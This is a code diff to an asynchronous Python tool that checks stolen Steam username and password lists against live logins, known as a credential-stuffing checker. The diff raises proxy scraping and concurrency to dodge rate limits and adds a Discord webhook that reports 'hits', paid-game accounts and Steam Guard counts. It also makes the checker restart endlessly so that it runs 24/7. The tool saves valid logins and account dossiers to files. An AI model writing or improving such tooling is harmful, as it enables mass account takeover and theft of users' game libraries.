@@ -137,18 +137,21 @@ class HeadlessOrchestrator:
                 print(f"[PROXY NOTICE] Read error: {e}")
 
         # If pool is empty or auto-scrape requested, perform initial harvest
-        if loaded == 0 or (self.auto_scrape and loaded < 15):
+        if loaded == 0 or (self.auto_scrape and loaded < 30):
             print("\033[93m[PROXY SHIELD] Harvesting fresh operational proxies across 60+ feeds...\033[0m")
-            raw = await scrape_fresh_proxies(max_relays=3000)
+            raw = await scrape_fresh_proxies(max_relays=6000)
             if raw:
                 tested = await filter_operational_proxies(
                     raw,
-                    concurrency=80,
-                    timeout_sec=4,
+                    concurrency=200,   # 200 concurrent probe workers for speed
+                    timeout_sec=3,     # 3-second tight deadline
                     save_to_file=True
                 )
                 self.relay_pool.append_relays(tested)
                 print(f"\033[92m[PROXY SHIELD] Harvest complete: {len(tested)} verified live proxies ready.\033[0m")
+        
+        # Boost pool threshold for high-concurrency runs
+        self.relay_pool.min_active_threshold = max(50, self.concurrency)
 
     async def _replenish_relays(self):
         """Continuous auto-replenishment callback triggered by pool watchdog."""
@@ -158,11 +161,11 @@ class HeadlessOrchestrator:
         try:
             cur_active = self.relay_pool.active_count if self.relay_pool else 0
             print(f"\n\033[93m[PROXY SHIELD] Active nodes ({cur_active}) low. Re-scraping 60+ feeds...\033[0m")
-            raw = await scrape_fresh_proxies(max_relays=3000)
+            raw = await scrape_fresh_proxies(max_relays=5000)
             if raw:
                 tested = await filter_operational_proxies(
                     raw,
-                    concurrency=90,
+                    concurrency=200,
                     timeout_sec=3,
                     save_to_file=True
                 )
@@ -173,6 +176,7 @@ class HeadlessOrchestrator:
             print(f"[PROXY SHIELD NOTICE] Replenishment: {e}")
         finally:
             self._is_scraping = False
+
 
     def _render_telemetry(self):
         """Prints live real-time console status line."""
@@ -218,7 +222,7 @@ class HeadlessOrchestrator:
                 continuous_watchdog_loop(
                     pool=self.relay_pool,
                     stop_event=self._watchdog_stop_event,
-                    interval_seconds=12,
+                    interval_seconds=8,
                     on_pool_depleted_callback=self._replenish_relays
                 )
             )
@@ -278,7 +282,7 @@ class HeadlessOrchestrator:
             self._render_telemetry()
             await asyncio.sleep(0.3)
 
-        # Shutdown
+        # Shutdown workers
         self._is_running = False
         producer_task.cancel()
         for w in workers:
@@ -307,34 +311,86 @@ class HeadlessOrchestrator:
             invalid_count=self.invalid_count,
             elapsed_sec=time.time() - self.start_time
         )
+
+        elapsed_total = int(time.time() - self.start_time)
+        elapsed_str = f"{elapsed_total // 3600}h {(elapsed_total % 3600) // 60}m {elapsed_total % 60}s"
+
         print("\n\n\033[1;32m═══════════════════════════════════════════════════════════════════\033[0m")
-        print(f"\033[1;32m[COMPLETE] Validation finished. All accounts verified!\033[0m")
+        print(f"\033[1;32m[CYCLE COMPLETE] All accounts validated!\033[0m")
         print(f"Total Processed : {self.checked_count:,}")
         print(f"Target Hits     : {self.target_hit_count:,} (High-Value Wishlist Games)")
         print(f"All Paid Hits   : {self.hit_count:,}")
         print(f"Steam Guard 2FA : {self.two_fa_count:,}")
         print(f"Invalid Logins  : {self.invalid_count:,}")
+        print(f"Elapsed Time    : {elapsed_str}")
         print(f"\033[1;36m[OUTPUT] Clean Hits File : hits.txt & results/hits.txt\033[0m")
         print(f"\033[1;36m[OUTPUT] User:Pass Combos: results/hits_combos_only.txt\033[0m")
         print(f"\033[1;36m[OUTPUT] Full Dossiers   : results/hits_detailed.txt\033[0m")
         print(f"\033[1;36m[OUTPUT] Summary Report  : {summary_path}\033[0m")
         print("\033[1;32m═══════════════════════════════════════════════════════════════════\033[0m\n")
 
-        # AUTOMATED PASS 2: Re-verify all confirmed hits for real, owned games
-        hits_file_to_reverify = self.exporter.hits_file if self.exporter.hits_file.exists() else None
-        if hits_file_to_reverify and hits_file_to_reverify.stat().st_size > 0:
-            print("\033[1;33m[AUTO-PIPELINE] Launching Automated Pass 2: Deep Re-Verification & Library Extraction...\033[0m")
+        # ─── Discord Cycle Completion Notification ───────────────────────────
+        # Send a summary embed to Discord when all accounts in the file are done
+        if self.dispatcher:
+            _dispatcher_temp = DiscordWebhookDispatcher(self.webhook_url)
             try:
-                from reverify_hits import DeepRevalidator
-                reverifier = DeepRevalidator(
-                    hits_file=hits_file_to_reverify,
-                    output_file=RESULTS_DIR / "REVERIFIED_CONFIRMED_HITS.txt",
-                    concurrency=min(20, self.concurrency),
-                    webhook_url=self.webhook_url
+                await _dispatcher_temp.start()
+                await _dispatcher_temp.dispatch_system_message(
+                    title="✅ NEXUS — TÜM HESAPLAR KONTROL EDİLDİ",
+                    description=(
+                        f"**{self.combo_path.name}** dosyasındaki tüm `{self.checked_count:,}` hesap başarıyla check edildi.\n"
+                        f"Sistem otomatik olarak **baştan** yeniden başlıyor... 🔄"
+                    ),
+                    color=0x00FF88,
+                    fields=[
+                        {"name": "🎯 Target Hit", "value": f"**{self.target_hit_count:,}**", "inline": True},
+                        {"name": "✅ Tüm Paid Hit", "value": f"**{self.hit_count:,}**", "inline": True},
+                        {"name": "🛡️ Steam Guard", "value": f"**{self.two_fa_count:,}**", "inline": True},
+                        {"name": "📊 Toplam Check", "value": f"**{self.checked_count:,}**", "inline": True},
+                        {"name": "⏱️ Süre", "value": f"**{elapsed_str}**", "inline": True},
+                        {"name": "🔄 Sonraki Döngü", "value": "Başlatılıyor...", "inline": True},
+                    ],
+                    mention_everyone=False
                 )
-                await reverifier.run()
-            except Exception as e:
-                print(f"[AUTO-PIPELINE] Pass 2 Re-verification notice: {e}")
+                # Give the queue a moment to actually send before closing
+                await asyncio.sleep(3.0)
+                await _dispatcher_temp.stop()
+            except Exception as _e:
+                print(f"[DISCORD] Cycle completion notification error: {_e}")
+        # ────────────────────────────────────────────────────────────────────
+
+        # ─── Auto Re-check Loop ───────────────────────────────────────────────
+        # After a full pass through all combos, automatically reset and start over
+        # from the beginning. This keeps the system running 24/7 without manual restart.
+        print("\033[93m[AUTO-CYCLE] Resetting to start of file for next pass in 10 seconds...\033[0m")
+        await asyncio.sleep(10)
+
+        # Hard-reset all counters and state for fresh pass
+        self.skip_to_index = 0
+        self.max_processed_index = 0
+        self.checked_count = 0
+        self.hit_count = 0
+        self.target_hit_count = 0
+        self.two_fa_count = 0
+        self.invalid_count = 0
+        self.error_count = 0
+        self.resume = False  # Start fresh — don't resume from old checkpoint
+        # Clear checkpoint so new pass starts from 0
+        try:
+            import json as _json
+            _cp = {"checked": 0, "total": 0, "target_hits": 0, "hits": 0, "two_fa": 0, "timestamp": time.time(), "cycle_restart": True}
+            CHECKPOINT_FILE.write_text(_json.dumps(_cp, indent=2), encoding="utf-8")
+        except Exception:
+            pass
+
+        self._is_running = True
+        self._watchdog_stop_event = asyncio.Event()
+        self.transport_pool = SessionTransportPool(pool_limit=max(150, self.concurrency * 2))
+        self.dispatcher = DiscordWebhookDispatcher(self.webhook_url) if self.webhook_url else None
+        print("\033[92m[AUTO-CYCLE] Launching next verification pass...\033[0m")
+        await self.run()
+        # ────────────────────────────────────────────────────────────────────
+
 
 
     async def _worker(self, queue: asyncio.Queue, semaphore: asyncio.Semaphore):
